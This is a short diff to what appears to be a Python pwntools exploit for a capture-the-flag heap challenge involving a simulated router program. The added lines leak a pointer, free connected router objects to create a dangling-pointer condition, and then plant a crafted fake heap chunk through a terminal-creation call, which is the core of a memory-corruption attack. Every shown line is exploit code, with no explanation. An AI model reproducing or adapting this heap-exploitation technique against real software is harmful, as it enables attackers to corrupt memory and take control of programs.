@@ -56,5 +56,27 @@ s.sendline("show")
 s.recvuntil(rotu1)
 s.recvuntil("connected to ")
 ptr = u64(s.recvline()[:-1].ljust(8,"\x00"))
+s.recvuntil(">")
+
+#cleanup time
+deleteRouter(rotu3)
+deleteRouter(rotu1)
+
+rotu1 = randoms(10)
+rotu2 = randoms(10)
+rotu3 = randoms(10)
+createRouter("tplink",rotu1)
+createRouter("tplink",rotu2)
+createRouter("tplink",rotu3)
+
+connect(rotu1, rotu2)
+connect(rotu3, rotu2)
+deleteRouter(rotu2)
+deleteRouter(rotu3)
+
+lptr = u64("ABCDEFGH")
+fakeblock = "A"*8+p64(lptr)+"B"*16
+createTerminal("windows",fakeblock, rotu1)
 
 print hex(ptr)
+show()
